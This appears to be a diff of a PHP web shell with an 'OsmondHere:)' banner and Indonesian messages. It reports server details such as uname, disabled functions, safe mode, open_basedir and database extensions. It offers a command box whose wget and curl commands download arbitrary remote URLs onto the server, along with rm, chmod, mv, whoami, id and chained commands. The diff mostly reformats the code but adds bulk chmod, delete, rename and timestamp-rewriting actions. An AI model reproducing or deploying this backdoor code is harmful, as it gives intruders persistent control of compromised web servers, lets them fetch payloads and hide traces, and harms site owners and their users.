@@ -183,10 +183,11 @@ function encode_path($p)
 $dlStatus = "";
 $commandOutput = "";
 
-function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
-    $statusPart  = "";
-    $outputPart  = "";
-    $cmdLine     = trim($cmdLine);
+function run_single_command($cmdLine, $path, &$statusPart, &$outputPart)
+{
+    $statusPart = "";
+    $outputPart = "";
+    $cmdLine = trim($cmdLine);
 
     if ($cmdLine === "") {
         $statusPart = "Perintah kosong.";
@@ -194,13 +195,13 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
     }
 
     $tokens = preg_split("/\s+/", $cmdLine);
-    $prog   = strtolower($tokens[0]);
+    $prog = strtolower($tokens[0]);
 
     if ($prog === "wget") {
         if (count($tokens) < 2) {
             $statusPart = "Format wget: wget URL -O file";
         } else {
-            $url  = $tokens[1];
+            $url = $tokens[1];
             $save = "";
 
             $count = count($tokens);
@@ -228,17 +229,19 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
                 if ($data === false) {
                     $statusPart = "Wget gagal: " . htmlspecialchars($url);
                 } else {
-                    if (@file_put_contents($path . "/" . $save, $data) !== false) {
+                    if (
+                        @file_put_contents($path . "/" . $save, $data) !== false
+                    ) {
                         $statusPart = "Wget OK → " . htmlspecialchars($save);
                     } else {
-                        $statusPart = "Gagal menyimpan file ke direktori saat ini.";
+                        $statusPart =
+                            "Gagal menyimpan file ke direktori saat ini.";
                     }
                 }
             }
         }
-
     } elseif ($prog === "curl") {
-        $url  = "";
+        $url = "";
         $save = "";
         $count = count($tokens);
 
@@ -261,7 +264,7 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
         } else {
             $ctx = stream_context_create([
                 "http" => [
-                    "method"  => "GET",
+                    "method" => "GET",
                     "timeout" => 10,
                 ],
             ]);
@@ -273,15 +276,20 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
                     if (!is_simple_name($save)) {
                         $statusPart = "Nama file tidak valid untuk curl -o.";
                     } else {
-                        if (@file_put_contents($path . "/" . $save, $data) !== false) {
-                            $statusPart = "Curl download OK → " . htmlspecialchars($save);
+                        if (
+                            @file_put_contents($path . "/" . $save, $data) !==
+                            false
+                        ) {
+                            $statusPart =
+                                "Curl download OK → " . htmlspecialchars($save);
                         } else {
                             $statusPart = "Curl gagal menyimpan file.";
                         }
                     }
                 } else {
                     if (strlen($data) > 5000) {
-                        $outputPart = substr($data, 0, 5000) . "\n... [truncated]";
+                        $outputPart =
+                            substr($data, 0, 5000) . "\n... [truncated]";
                     } else {
                         $outputPart = $data;
                     }
@@ -289,7 +297,6 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
                 }
             }
         }
-
     } elseif ($prog === "ls" || $prog === "dir") {
         $detailed = false;
         foreach ($tokens as $t) {
@@ -298,7 +305,7 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
             }
         }
 
-        $scan  = scandir($path);
+        $scan = scandir($path);
         $lines = [];
         foreach ($scan as $name) {
             if ($name === ".") {
@@ -310,10 +317,10 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
             }
 
             $isDir = is_dir($full) ? "d" : "-";
-            $perm  = substr(sprintf("%o", @fileperms($full)), -4);
-            $size  = is_dir($full) ? "-" : human_filesize(@filesize($full));
+            $perm = substr(sprintf("%o", @fileperms($full)), -4);
+            $size = is_dir($full) ? "-" : human_filesize(@filesize($full));
             $mtime = @filemtime($full);
-            $time  = $mtime ? date("Y-m-d H:i:s", $mtime) : "-";
+            $time = $mtime ? date("Y-m-d H:i:s", $mtime) : "-";
 
             if ($detailed) {
                 $lines[] = sprintf(
@@ -330,7 +337,6 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
         }
         $outputPart = implode("\n", $lines);
         $statusPart = "Output untuk: " . htmlspecialchars($cmdLine);
-
     } elseif ($prog === "mkdir") {
         if (count($tokens) < 2) {
             $statusPart = "Format mkdir: mkdir nama_dir";
@@ -346,7 +352,6 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
                 }
             }
         }
-
     } elseif ($prog === "touch") {
         if (count($tokens) < 2) {
             $statusPart = "Format touch: touch nama_file";
@@ -362,7 +367,6 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
                 }
             }
         }
-
     } elseif ($prog === "rm") {
         if (count($tokens) < 2) {
             $statusPart = "Format rm: rm nama_file";
@@ -372,7 +376,11 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
                 $statusPart = "Nama target tidak valid.";
             } else {
                 $target = realpath($path . "/" . $name);
-                if ($target && strpos($target, $path) === 0 && file_exists($target)) {
+                if (
+                    $target &&
+                    strpos($target, $path) === 0 &&
+                    file_exists($target)
+                ) {
                     if (is_dir($target)) {
                         $ok = @rmdir($target);
                     } else {
@@ -386,7 +394,6 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
                 }
             }
         }
-
     } elseif ($prog === "chmod") {
         if (count($tokens) < 3) {
             $statusPart = "Format chmod: chmod 0755 nama_file";
@@ -402,12 +409,14 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
                 } else {
                     $ok = @chmod($target, octdec($mode));
                     $statusPart = $ok
-                        ? "chmod OK: " . htmlspecialchars($mode) . " " . htmlspecialchars($name)
+                        ? "chmod OK: " .
+                            htmlspecialchars($mode) .
+                            " " .
+                            htmlspecialchars($name)
                         : "chmod gagal.";
                 }
             }
         }
-
     } elseif ($prog === "cd") {
         if (count($tokens) < 2) {
             $statusPart = "Format cd: cd folder";
@@ -427,10 +436,8 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
                 $statusPart = "cd gagal: folder tidak ditemukan.";
             }
         }
-
     } elseif ($prog === "pwd") {
         $statusPart = "Current directory: " . htmlspecialchars($path);
-
     } elseif ($prog === "mv") {
         if (count($tokens) < 3) {
             $statusPart = "Format mv: mv sumber target";
@@ -448,52 +455,56 @@ function run_single_command($cmdLine, $path, &$statusPart, &$outputPart) {
                     $statusPart = "mv gagal: sumber tidak ditemukan.";
                 } else {
                     if (@rename($srcFull, $dstFull)) {
-                        $statusPart = "mv OK: " . htmlspecialchars($src) . " → " . htmlspecialchars($dst);
+                        $statusPart =
+                            "mv OK: " .
+                            htmlspecialchars($src) .
+                            " → " .
+                            htmlspecialchars($dst);
                     } else {
                         $statusPart = "mv gagal.";
                     }
                 }
             }
         }
-
     } elseif ($prog === "whoami") {
-        $u           = @get_current_user();
-        $outputPart  = "User: " . $u;
-        $statusPart  = "Output whoami.";
-
+        $u = @get_current_user();
+        $outputPart = "User: " . $u;
+        $statusPart = "Output whoami.";
     } elseif ($prog === "id") {
         if (function_exists("posix_getuid")) {
             $uid = posix_getuid();
             $gid = posix_getgid();
-            $pw  = @posix_getpwuid($uid);
-            $gr  = @posix_getgrgid($gid);
+            $pw = @posix_getpwuid($uid);
+            $gr = @posix_getgrgid($gid);
 
             $uname = $pw && isset($pw["name"]) ? $pw["name"] : $uid;
             $gname = $gr && isset($gr["name"]) ? $gr["name"] : $gid;
 
             $outputPart = "uid=$uid($uname) gid=$gid($gname)";
         } else {
-            $outputPart = "Extension posix tidak tersedia. get_current_user(): " . @get_current_user();
+            $outputPart =
+                "Extension posix tidak tersedia. get_current_user(): " .
+                @get_current_user();
         }
         $statusPart = "Output id.";
-
     } else {
         $statusPart = "Perintah tidak didukung: " . htmlspecialchars($prog);
     }
 }
 
 if (isset($_POST["dl_cmd"]) && trim($_POST["dl_cmd"]) !== "") {
-
     $input = $_POST["dl_cmd"];
 
-    $cmdChunks = preg_split('/&&|;/', $input);
+    $cmdChunks = preg_split("/&&|;/", $input);
 
     $statusList = [];
     $outputList = [];
 
     foreach ($cmdChunks as $chunk) {
         $chunk = trim($chunk);
-        if ($chunk === "") continue;
+        if ($chunk === "") {
+            continue;
+        }
 
         $s = "";
         $o = "";
@@ -516,7 +527,106 @@ if (isset($_POST["dl_cmd"]) && trim($_POST["dl_cmd"]) !== "") {
     }
 }
 
-echo "<style>body{font-family:Arial,sans-serif;font-size:13px;background:#f3f3f3;color:#222;margin:10px}h2,h3{margin:8px 0 4px;font-weight:600}p{margin:3px 0}ul{list-style:none;padding-left:0;margin:0;border-top:2px solid #bbb}li{margin:0;padding:4px 6px;line-height:1.3em;display:grid;grid-template-columns:340px 80px 140px 140px 150px 50px 90px 190px 80px;align-items:center;border-bottom:2px solid #ccc;background:#fff}li:nth-child(even){background:#f9f9f9}.grid-header{font-weight:700;background:#ddd!important}a{color:#06c;text-decoration:none;font-weight:500}a:hover{color:#004c99;text-decoration:underline}form{display:inline;margin:0}input[type=password],input[type=text],textarea{font-size:12px;padding:3px 5px;margin-right:4px;border:1px solid #aaa;border-radius:3px}textarea{font-family:monospace;height:420px}button{font-size:12px;padding:3px 8px;margin-left:2px;border:1px solid #666;border-radius:3px;background:#e6e6e6;cursor:pointer}button:hover{background:#d5d5d5}div{margin:2px 0}hr{margin:6px 0;border:0;border-top:2px solid #bbb}.action-row{background:#f5f5f5}.action-row div{margin:1px 0}.writable{color:green;font-weight:600}.readonly{color:#b30000;font-weight:600}.status-msg{margin:5px 0;padding:5px 8px;border-radius:3px;background:#eef3ff;border:1px solid #9af;font-size:12px}.curl-box{margin-top:4px;width:100%;max-width:800px;height:150px;font-family:monospace;font-size:11px;white-space:pre;overflow:auto}li>div:nth-child(1){white-space:nowrap;overflow:hidden;text-overflow:ellipsis}</style>";
+if (
+    isset($_POST["bulk_action"]) &&
+    !empty($_POST["bulk_action"]) &&
+    isset($_POST["bulk_items"]) &&
+    is_array($_POST["bulk_items"])
+) {
+    $bulkAction = $_POST["bulk_action"];
+    $bulkValue = $_POST["bulk_value"] ?? "";
+
+    foreach ($_POST["bulk_items"] as $name) {
+        if (!is_simple_name($name)) {
+            continue;
+        }
+        $target = $path . "/" . $name;
+        if (!file_exists($target)) {
+            continue;
+        }
+
+        if ($bulkAction === "chmod") {
+            $mode = trim($bulkValue);
+            if (preg_match('/^[0-7]{3,4}$/', $mode)) {
+                @chmod($target, octdec($mode));
+            }
+        } elseif ($bulkAction === "touch") {
+            $ts = strtotime($bulkValue);
+            if ($ts !== false) {
+                @touch($target, $ts);
+            }
+        } elseif ($bulkAction === "delete") {
+            if (is_dir($target)) {
+                @rmdir($target);
+            } else {
+                @unlink($target);
+            }
+        } elseif ($bulkAction === "rename_prefix") {
+            $prefix = $bulkValue;
+            if ($prefix !== "") {
+                $newName = $prefix . $name;
+                if (is_simple_name($newName)) {
+                    @rename($target, $path . "/" . $newName);
+                }
+            }
+        } elseif ($bulkAction === "rename_suffix") {
+            $suffix = $bulkValue;
+            if ($suffix !== "") {
+                $dotPos = strrpos($name, ".");
+                if ($dotPos !== false) {
+                    $base = substr($name, 0, $dotPos);
+                    $ext = substr($name, $dotPos);
+                    $newName = $base . $suffix . $ext;
+                } else {
+                    $newName = $name . $suffix;
+                }
+                if (is_simple_name($newName)) {
+                    @rename($target, $path . "/" . $newName);
+                }
+            }
+        }
+    }
+
+    header("Location: ?path=" . encode_path($path));
+    exit();
+}
+
+echo "<style>
+body{font-family:Arial,sans-serif;font-size:13px;background:#f3f3f3;color:#222;margin:10px}
+h2,h3{margin:8px 0 4px;font-weight:600}
+p{margin:3px 0}
+ul{list-style:none;padding-left:0;margin:0;border-top:2px solid #bbb}
+li{
+    margin:0;
+    padding:4px 6px;
+    line-height:1.3em;
+    display:grid;
+    grid-template-columns:24px 320px 80px 140px 140px 150px 50px 90px 190px 80px;
+    align-items:center;
+    border-bottom:2px solid #ccc;
+    background:#fff
+}
+li:nth-child(even){background:#f9f9f9}
+li:hover{background:#e6f4ff}
+.grid-header{font-weight:700;background:#ddd!important}
+.grid-header:hover{background:#ddd!important}
+a{color:#06c;text-decoration:none;font-weight:500}
+a:hover{color:#004c99;text-decoration:underline}
+form{display:inline;margin:0}
+input[type=password],input[type=text],textarea{font-size:12px;padding:3px 5px;margin-right:4px;border:1px solid #aaa;border-radius:3px}
+textarea{font-family:monospace;height:420px}
+button{font-size:12px;padding:3px 8px;margin-left:2px;border:1px solid #666;border-radius:3px;background:#e6e6e6;cursor:pointer}
+button:hover{background:#d5d5d5}
+div{margin:2px 0}
+hr{margin:6px 0;border:0;border-top:2px solid #bbb}
+.action-row{background:#f5f5f5}
+.action-row div{margin:1px 0}
+.writable{color:green;font-weight:600}
+.readonly{color:#b30000;font-weight:600}
+.status-msg{margin:5px 0;padding:5px 8px;border-radius:3px;background:#eef3ff;border:1px solid #9af;font-size:12px}
+.curl-box{margin-top:4px;width:100%;max-width:800px;height:150px;font-family:monospace;font-size:11px;white-space:pre;overflow:auto}
+li>div:nth-child(2){white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+</style>";
 
 $uname = php_uname();
 
@@ -615,75 +725,163 @@ if ($disabledFunctions === "") {
     $disabledFunctions = "All Functions Accessible";
 }
 
-echo '<h2>OsmondHere:)</h2>';
-$now        = date('Y-m-d H:i:s');
-$labelColor = '#0055aa';
-$onColor    = '#008800';
-$offColor   = '#cc0000';
+echo "<h2>OsmondHere:)</h2>";
+$now = date("Y-m-d H:i:s");
+$labelColor = "#0055aa";
+$onColor = "#008800";
+$offColor = "#cc0000";
 
 echo '<div style="font-family:Consolas,monospace;font-size:12px;background:#fff;border:1px solid #ccc;padding:6px 8px;margin:5px 0 10px;line-height:1.4em;">';
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">Uname:</span> '
-     . htmlspecialchars($uname) . '<br>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Uname:</span> ' .
+    htmlspecialchars($uname) .
+    "<br>";
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">User:</span> '
-     . htmlspecialchars((string)$userId) . ' [ ' . htmlspecialchars((string)$userName) . ' ] '
-     . '<span style="color:'.$labelColor.';font-weight:bold;"> Group:</span> '
-     . htmlspecialchars((string)$groupId) . ' [ ' . htmlspecialchars((string)$groupName) . ' ]<br>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">User:</span> ' .
+    htmlspecialchars((string) $userId) .
+    " [ " .
+    htmlspecialchars((string) $userName) .
+    " ] " .
+    '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;"> Group:</span> ' .
+    htmlspecialchars((string) $groupId) .
+    " [ " .
+    htmlspecialchars((string) $groupName) .
+    " ]<br>";
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">PHP:</span> '
-     . htmlspecialchars($phpVersion)
-     . ' Safe Mode: <span style="color:'.($safeMode === 'ON' ? $onColor : $offColor).';font-weight:bold;">'
-     . htmlspecialchars($safeMode) . '</span><br>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">PHP:</span> ' .
+    htmlspecialchars($phpVersion) .
+    ' Safe Mode: <span style="color:' .
+    ($safeMode === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    htmlspecialchars($safeMode) .
+    "</span><br>";
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">DateTime:</span> '
-     . htmlspecialchars($now) . '<br>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">DateTime:</span> ' .
+    htmlspecialchars($now) .
+    "<br>";
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">ServerIP:</span> '
-     . htmlspecialchars($serverIp)
-     . ' <span style="color:'.$labelColor.';font-weight:bold;">Your IP:</span> '
-     . htmlspecialchars($clientIp) . '<br>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">ServerIP:</span> ' .
+    htmlspecialchars($serverIp) .
+    ' <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Your IP:</span> ' .
+    htmlspecialchars($clientIp) .
+    "<br>";
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">Domains:</span> '
-     . htmlspecialchars($domainsInfo) . '<br>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Domains:</span> ' .
+    htmlspecialchars($domainsInfo) .
+    "<br>";
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">HDD:</span> '
-     . htmlspecialchars($hddInfo) . '<br>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">HDD:</span> ' .
+    htmlspecialchars($hddInfo) .
+    "<br>";
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">Windows:</span> '
-     . htmlspecialchars($windowsLine) . '<br>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Windows:</span> ' .
+    htmlspecialchars($windowsLine) .
+    "<br>";
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">Downloader:</span> -------------<br>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Downloader:</span> -------------<br>';
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">Disable Functions:</span> '
-     . '<span style="color:'.$offColor.';">'
-     . htmlspecialchars($disabledFunctions)
-     . '</span><br>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Disable Functions:</span> ' .
+    '<span style="color:' .
+    $offColor .
+    ';">' .
+    htmlspecialchars($disabledFunctions) .
+    "</span><br>";
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">CURL :</span> '
-     . '<span style="color:'.($curlOn === "ON" ? $onColor : $offColor).';font-weight:bold;">'.$curlOn.'</span>'
-     . ' | <span style="color:'.$labelColor.';font-weight:bold;">SSH2 :</span> '
-     . '<span style="color:'.(extension_loaded("ssh2") ? $onColor : $offColor).';font-weight:bold;">'
-     . (extension_loaded("ssh2") ? "ON" : "OFF") . '</span>'
-     . ' | <span style="color:'.$labelColor.';font-weight:bold;">Magic Quotes :</span> '
-     . '<span style="color:'.($magicQuotes === "ON" ? $onColor : $offColor).';font-weight:bold;">'.$magicQuotes.'</span>'
-     . ' | <span style="color:'.$labelColor.';font-weight:bold;">MySQL :</span> '
-     . '<span style="color:'.($mysqlOn === "ON" ? $onColor : $offColor).';font-weight:bold;">'.$mysqlOn.'</span>'
-     . ' | <span style="color:'.$labelColor.';font-weight:bold;">MSSQL :</span> '
-     . '<span style="color:'.($mssqlOn === "ON" ? $onColor : $offColor).';font-weight:bold;">'.$mssqlOn.'</span>'
-     . ' | <span style="color:'.$labelColor.';font-weight:bold;">PostgreSQL :</span> '
-     . '<span style="color:'.($pgsqlOn === "ON" ? $onColor : $offColor).';font-weight:bold;">'.$pgsqlOn.'</span>'
-     . ' | <span style="color:'.$labelColor.';font-weight:bold;">Oracle :</span> '
-     . '<span style="color:'.($ociOn === "ON" ? $onColor : $offColor).';font-weight:bold;">'.$ociOn.'</span>'
-     . '<br>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">CURL :</span> ' .
+    '<span style="color:' .
+    ($curlOn === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $curlOn .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">SSH2 :</span> ' .
+    '<span style="color:' .
+    (extension_loaded("ssh2") ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    (extension_loaded("ssh2") ? "ON" : "OFF") .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Magic Quotes :</span> ' .
+    '<span style="color:' .
+    ($magicQuotes === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $magicQuotes .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">MySQL :</span> ' .
+    '<span style="color:' .
+    ($mysqlOn === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $mysqlOn .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">MSSQL :</span> ' .
+    '<span style="color:' .
+    ($mssqlOn === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $mssqlOn .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">PostgreSQL :</span> ' .
+    '<span style="color:' .
+    ($pgsqlOn === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $pgsqlOn .
+    "</span>" .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Oracle :</span> ' .
+    '<span style="color:' .
+    ($ociOn === "ON" ? $onColor : $offColor) .
+    ';font-weight:bold;">' .
+    $ociOn .
+    "</span>" .
+    "<br>";
 
-echo '<span style="color:'.$labelColor.';font-weight:bold;">Open_basedir :</span> '
-     . htmlspecialchars($openBasedir)
-     . ' | <span style="color:'.$labelColor.';font-weight:bold;">Safe_mode_exec_dir :</span> '
-     . htmlspecialchars($safeExecDir)
-     . ' | <span style="color:'.$labelColor.';font-weight:bold;">Safe_mode_include_dir :</span> '
-     . htmlspecialchars($safeInclDir)
-     . '</div>';
+echo '<span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Open_basedir :</span> ' .
+    htmlspecialchars($openBasedir) .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Safe_mode_exec_dir :</span> ' .
+    htmlspecialchars($safeExecDir) .
+    ' | <span style="color:' .
+    $labelColor .
+    ';font-weight:bold;">Safe_mode_include_dir :</span> ' .
+    htmlspecialchars($safeInclDir) .
+    "</div>";
 
 $scan = scandir($path);
 
@@ -799,8 +997,25 @@ if ($commandOutput !== "") {
 
 echo "<hr>";
 
+echo "<h3>Bulk Action</h3>
+<form id='bulkForm' method='POST' style='margin-bottom:6px;'>
+    <select name='bulk_action'>
+        <option value=''>-- Pilih aksi --</option>
+        <option value='chmod'>Chmod (semua terpilih)</option>
+        <option value='touch'>Touch (ubah waktu)</option>
+        <option value='delete'>Delete</option>
+        <option value='rename_prefix'>Rename: tambah prefix</option>
+        <option value='rename_suffix'>Rename: tambah suffix</option>
+    </select>
+    <input type='text' name='bulk_value'
+           placeholder='0755 / 2025-12-31 12:00 / prefix_ / _old'
+           style='width:280px;'>
+    <button type='submit'>Apply ke yang tercentang</button>
+</form>";
+
 echo "<ul>
 <li class='grid-header'>
+    <div>Sel</div>
     <div>Name</div>
     <div>Size</div>
     <div>Modified</div>
@@ -882,6 +1097,13 @@ foreach ($entries as $f) {
 
     echo "<li>";
 
+    echo "<div>
+        <input type='checkbox'
+               form='bulkForm'
+               name='bulk_items[]'
+               value='{$safeName}'>
+      </div>";
+
     echo "<div title='{$safeName}'>";
     if (is_dir($full)) {
         echo "📁 <a href='?path=" .
@@ -931,42 +1153,42 @@ foreach ($entries as $f) {
     echo "</li>";
 
     echo "<li id='rr_{$id}' class='action-row' style='display:none;'>
-            <div></div><div></div><div></div><div></div><div></div><div></div>
-            <div>
-                <form method='POST'>
-                    <input type='hidden' name='rename_old' value='{$safeName}'>
-                    <input type='text' name='rename_new' value='{$safeName}'>
-                    <button type='submit'>Rename</button>
-                </form>
-            </div>
-            <div></div><div></div>
-          </li>";
+        <div></div><div></div><div></div><div></div><div></div><div></div><div></div>
+        <div>
+            <form method='POST'>
+                <input type='hidden' name='rename_old' value='{$safeName}'>
+                <input type='text' name='rename_new' value='{$safeName}'>
+                <button type='submit'>Rename</button>
+            </form>
+        </div>
+        <div></div><div></div>
+      </li>";
 
     echo "<li id='cc_{$id}' class='action-row' style='display:none;'>
-            <div></div><div></div><div></div><div></div><div></div><div></div><div></div>
-            <div>
-                <form method='POST'>
-                    <input type='hidden' name='chmod_file' value='{$safeName}'>
-                    <input type='text' name='new_mode' placeholder='0755' style='width:70px;'>
-                    <button type='submit'>Chmod</button>
-                </form>
-            </div>
-            <div></div>
-          </li>";
+        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
+        <div>
+            <form method='POST'>
+                <input type='hidden' name='chmod_file' value='{$safeName}'>
+                <input type='text' name='new_mode' placeholder='0755' style='width:70px;'>
+                <button type='submit'>Chmod</button>
+            </form>
+        </div>
+        <div></div>
+      </li>";
 
     $humanTime = $mtime ? date("Y-m-d H:i:s", $mtime) : "";
     $safeTime = htmlspecialchars($humanTime, ENT_QUOTES);
 
     echo "<li id='tt_{$id}' class='action-row' style='display:none;'>
-            <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
-            <div>
-                <form method='POST'>
-                    <input type='hidden' name='touch_target' value='{$safeName}'>
-                    <input type='text' name='touch_time' value='{$safeTime}' style='width:160px;'>
-                    <button type='submit'>Touch</button>
-                </form>
-            </div>
-          </li>";
+        <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
+        <div>
+            <form method='POST'>
+                <input type='hidden' name='touch_target' value='{$safeName}'>
+                <input type='text' name='touch_time' value='{$safeTime}' style='width:160px;'>
+                <button type='submit'>Touch</button>
+            </form>
+        </div>
+      </li>";
 }
 
 echo "</ul>";
